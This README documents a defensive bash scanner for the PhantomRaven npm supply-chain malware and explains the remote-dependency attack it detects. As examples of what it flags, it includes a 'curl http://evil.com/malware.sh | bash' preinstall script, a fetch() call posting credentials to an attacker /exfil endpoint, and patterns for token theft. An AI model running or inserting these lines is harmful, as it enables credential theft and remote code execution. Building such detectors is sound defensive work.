# 🛡️ PhantomRaven Hunter

**A comprehensive shell-based scanner for detecting PhantomRaven npm supply chain malware and similar threats.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Shell Script](https://img.shields.io/badge/shell-bash-green.svg)](https://www.gnu.org/software/bash/)
[![Tested on](https://img.shields.io/badge/tested%20on-ubuntu%20|%20debian-blue.svg)](https://github.com/dpr1815/phantomraven-hunter)

## 🚨 What is PhantomRaven?

PhantomRaven is a sophisticated npm supply chain attack discovered in October 2025 by [Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies). The campaign:

- Infected **126 malicious npm packages** with over **86,000 downloads**
- Stole npm tokens, GitHub credentials, and CI/CD secrets from developers worldwide
- Used **Remote Dynamic Dependencies (RDD)** to hide malicious code from traditional security scanners
- Remained undetected from **August to October 2025**

### The RDD Technique

Traditional npm packages specify dependencies like:

```json
"dependencies": {
  "express": "^4.18.0"
}
```

PhantomRaven used HTTP URLs instead:

```json
"dependencies": {
  "unused-imports": "http://packages.storeartifact.com/npm/unused-imports"
}
```

When installed, npm fetches the malicious package from the attacker's server, completely bypassing security scans. The malicious code never appears in the npm registry.

## 🎯 Why This Scanner?

Most security tools **failed to detect PhantomRaven** because:

1. ❌ They rely on static analysis of the npm registry
2. ❌ They don't follow HTTP/HTTPS URLs in dependencies
3. ❌ They don't analyze actual package behavior
4. ❌ They miss dynamically-fetched payloads

**PhantomRaven Hunter** catches what others miss by:

1. ✅ Detecting Remote Dynamic Dependencies (RDD)
2. ✅ Identifying all 126 known malicious packages
3. ✅ Analyzing lifecycle scripts for auto-execution
4. ✅ Deep-scanning code for credential theft patterns
5. ✅ Checking installation timing against attack timeline
6. ✅ Smart whitelisting to reduce false positives

## 🚀 Quick Start

### Prerequisites

```bash
# Required
sudo apt install jq  # Ubuntu/Debian
brew install jq      # macOS

# Verify
jq --version
```

### Installation

```bash
# Clone the repository
git clone https://github.com/dpr1815/phantomraven-hunter.git
cd phantomraven-hunter

# Make executable
chmod +x phantomraven-hunter.sh

# Run scan
./phantomraven-hunter.sh /path/to/your/projects
```

### Usage Modes

#### 1. Basic Scan (Fast - ~30 seconds)

```bash
./phantomraven-hunter.sh ~/projects
```

Checks for:

- Remote Dynamic Dependencies
- Known malicious packages
- Suspicious lifecycle scripts
- Malicious domain references

#### 2. Deep Scan (Recommended - ~2-3 minutes)

```bash
./phantomraven-hunter.sh --deep ~/projects
```

Additional checks:

- Credential theft patterns in code
- Suspicious network calls
- Environment variable harvesting
- Config file access attempts

#### 3. Paranoid Mode (Maximum - ~5 minutes)

```bash
./phantomraven-hunter.sh --paranoid ~/projects
```

Everything plus:

- Installation timing analysis (Aug-Oct 2025)
- Package integrity verification
- System compromise indicators
- ~/.gitconfig and ~/.npmrc forensics

#### 4. Verbose Mode

```bash
./phantomraven-hunter.sh --deep --verbose ~/projects
```

Shows all findings including whitelisted safe packages.

## 📊 Understanding Results

### Exit Codes

- `0` = Clean (no threats detected)
- `1` = CRITICAL (malware detected - take immediate action)
- `2` = WARNING (suspicious indicators found - review carefully)

### Example: Clean System ✅

```
═══════════════════════════════════════════════════════════
                    SCAN RESULTS
═══════════════════════════════════════════════════════════

Summary:
├─ Remote Dynamic Dependencies: 0
├─ Known Malicious Packages: 0
├─ Suspicious Lifecycle Scripts: 3
├─ Credential Theft Patterns: 0
└─ Suspicious Network Calls: 0

═══════════════════════════════════════════════════════════
✓ No critical threats detected
```

### Example: Malware Detected 🚨

```
═══════════════════════════════════════════════════════════
🚨 CRITICAL: Remote Dynamic Dependencies:
════════════════════════════════════════
[CRITICAL] unused-imports -> http://packages.storeartifact.com/npm/unused-imports
  File: project/package.json
  Status: KNOWN_MALICIOUS_DOMAIN

🚨 CRITICAL: MALWARE DETECTED!

IMMEDIATE ACTIONS REQUIRED:
1. DO NOT run npm install
2. Disconnect this machine from network
3. Rotate ALL credentials immediately
   - GitHub tokens: https://github.com/settings/tokens
   - npm tokens: npm token list
   - CI/CD secrets
...
```

## 🔍 What Gets Scanned

The scanner intelligently searches through:

```
project/
├── package.json          ✓ RDD & malicious packages
├── package-lock.json     ✓ Timing analysis
├── node_modules/
│   └── */
│       ├── package.json  ✓ Scripts & dependencies
│       └── *.js          ✓ Deep code analysis (--deep)
├── ~/.gitconfig          ✓ System compromise (--paranoid)
└── ~/.npmrc              ✓ Token exposure (--paranoid)
```

## 🎓 Detection Capabilities

### 1. Remote Dynamic Dependencies (RDD)

**The Primary Attack Vector**

Detects HTTP/HTTPS URLs in dependencies:

```json
❌ MALICIOUS
"dependencies": {
  "pkg": "http://packages.storeartifact.com/malware.tgz"
}

✅ SAFE (GitHub - whitelisted)
"dependencies": {
  "test262": "https://github.com/tc39/test262#commit-hash"
}
```

### 2. Known Malicious Packages

All 126 packages from the PhantomRaven campaign:

- `unused-imports`
- `eslint-comments`
- `transform-react-remove-prop-types`
- `crowdstrike` (fake package, not the real security company!)
- [See full list](data/malicious-packages.txt)

### 3. Lifecycle Script Analysis

Flags suspicious auto-executing scripts:

```json
⚠️ SUSPICIOUS
"scripts": {
  "preinstall": "curl http://evil.com/malware.sh | bash"
}

✅ SAFE (esbuild - whitelisted)
"scripts": {
  "postinstall": "node install.js"
}
```

### 4. Credential Theft Patterns (--deep)

Searches for:

- `process.env.NPM_TOKEN`
- `process.env.GITHUB_TOKEN`
- `.gitconfig` file access
- `.npmrc` file access
- `CI_` environment variables

### 5. Network Activity (--deep)

Detects suspicious outbound connections:

```javascript
⚠️ FLAGGED
fetch('http://packages.storeartifact.com/exfil', {
    method: 'POST',
    body: JSON.stringify(credentials)
});
```

### 6. Timeline Analysis (--paranoid)

Checks if packages were installed during PhantomRaven's active period:

- **August 1, 2025 - October 31, 2025**

### 7. System Forensics (--paranoid)

- Checks `~/.gitconfig` modification time
- Validates `~/.npmrc` for exposed tokens
- Scans environment for leaked secrets

## 🛠️ Advanced Usage

### Scan Multiple Projects

```bash
for dir in ~/projects/*/; do
    echo "Scanning $dir"
    ./phantomraven-hunter.sh --deep "$dir"
done
```

### Save Report to File

```bash
./phantomraven-hunter.sh --paranoid ~/projects 2>&1 | tee report.txt
```

### CI/CD Integration

```yaml
# .github/workflows/security.yml
name: PhantomRaven Scan
on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Install jq
        run: sudo apt-get install -y jq

      - name: Run PhantomRaven Hunter
        run: |
          chmod +x phantomraven-hunter.sh
          ./phantomraven-hunter.sh --deep .
```

### Pre-commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

if [ -f "package.json" ]; then
    ./phantomraven-hunter.sh --deep . || exit 1
fi
```

## 🧪 Testing

### Run Test Suite

```bash
cd tests/
./run_tests.sh
```

## 🔒 Security Best Practices

### If Malware IS Detected

1. **Immediate Isolation**

   ```bash
   # Disconnect from network
   sudo ip link set eth0 down
   ```

2. **Check What Was Stolen**

   ```bash
   cat ~/.gitconfig
   cat ~/.npmrc
   env | grep TOKEN
   ```

3. **Rotate ALL Credentials**

   - GitHub: https://github.com/settings/tokens
   - npm: `npm token list` && `npm token revoke <id>`
   - CI/CD: Update all secrets in GitHub Actions, GitLab CI, etc.

4. **Clean Rebuild**

   ```bashs
   # Remove all node_modules
   find ~/projects -name "node_modules" -type d -exec rm -rf {} +

   # Remove lock files
   find ~/projects -name "package-lock.json" -delete

   # Reinstall safely
   npm install --ignore-scripts
   ```

### Prevention

```bash
# 1. Use lock files with integrity checks
npm ci  # instead of npm install

# 2. Disable auto-script execution
echo "ignore-scripts=true" >> ~/.npmrc

# 3. Regular scanning
./phantomraven-hunter.sh --deep ~/projects

# 4. Audit before adding packages
npm audit
npm view <package-name> dependencies

# 5. Verify AI-suggested packages
# Never blindly trust GitHub Copilot or ChatGPT package recommendations
```

## 📝 False Positives

The scanner intelligently whitelists known-safe patterns:

### Safe Domains

- `github.com`
- `gitlab.com`
- `bitbucket.org`

### Safe Packages with Install Scripts

- `esbuild` - JavaScript bundler
- `@swc/core` - TypeScript/JavaScript compiler
- `cypress`, `puppeteer`, `playwright` - Testing frameworks
- `electron` - Desktop app framework

### Your Scan Had False Positives?

**Example from a real scan:**

```
Package: test262
URL: https://github.com/tc39/test262#commit-hash
```

**Verdict:** ✅ SAFE - GitHub reference from official TC39 JavaScript test suite

## 🤝 Contributing

Contributions welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new detections
4. Submit a pull request

### Adding New Malware Signatures

Edit the arrays in `phantomraven-hunter.sh`:

```bash
MALICIOUS_DOMAINS=(
    "packages.storeartifact.com"
    "your-new-domain.com"  # Add here
)

MALICIOUS_PACKAGES=(
    "unused-imports"
    "your-new-package"  # Add here
)
```

## 📚 Resources

- [Original Koi Security Report](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
- [Dark Reading Coverage](https://www.darkreading.com/application-security/malicious-npm-packages-invisible-dependencies)
- [The Hacker News](https://thehackernews.com/2025/10/phantomraven-malware-found-in-126-npm.html)
- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)

## ⚖️ License

MIT License - See [LICENSE](LICENSE) file

## ⚠️ Disclaimer

This tool is provided for defensive security purposes only. Use responsibly and in accordance with applicable laws and regulations. The authors are not responsible for misuse or damage caused by this tool.

## 🙏 Credits

- **Koi Security** - For discovering PhantomRaven and publishing detailed IOCs
- **Oren Yomtov** - Lead researcher on the PhantomRaven campaign
- **npm Security Team** - For rapid response in removing malicious packages
- **Open Source Community** - For maintaining secure package ecosystems

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/dpr1815/phantomraven-hunter/issues)
- **Security**: Report vulnerabilities privately to [security@email.com]

---

**Stay safe! Scan often. Trust but verify.** 🛡️

Last updated: November 2025
